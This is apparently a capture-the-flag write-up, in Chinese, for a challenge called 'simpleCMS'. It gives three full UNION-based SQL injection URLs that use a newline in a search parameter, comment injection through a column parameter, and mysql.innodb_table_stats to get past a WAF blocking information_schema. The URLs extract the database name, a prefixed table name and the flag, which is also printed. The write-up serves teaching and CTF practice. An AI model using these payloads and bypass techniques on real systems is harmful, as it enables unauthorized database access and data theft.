# simpleCMS

col沒擋`#`和`:`  (col也會根據`|`去explode，然後把好幾個sql串起來)

所以可以註解掉後面整句

接著search可以塞換行，繼續接SQL語句

閉合前面的LOWER(

後面就可以UNION based撈資料惹

比較麻煩的是table有prefix，但是information_schema被waf擋掉惹

還好這題table engine是innodb，也可以從這邊撈表名

## 爆庫名
http://13.125.3.183/index.php?act=board&mid=search&type=2&col=title|idx%23&search=%0a)union+select+1,database(),3,4,5 limit 0,1--+

## 不用information_schema爆表名 (用innodb撈表名)
http://13.125.3.183/index.php?act=board&mid=search&type=2&col=title|idx%23&search=%0a)union+select+1,table_name,3,4,5 from mysql.innodb_table_stats limit 2,1--+

得到`41786c497656426a6149_flag`

## 爆flag (不需要column name)
http://13.125.3.183/index.php?act=board&mid=search&type=2&col=title|idx%23&search=%0a)union+select+c,2,3,4,5 from (SELECT 1 a,2 b,3 c, 4 d UNION SELECT * FROM 41786c497656426a6149_flag)x limit 1,1--+

## flag
`flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}`
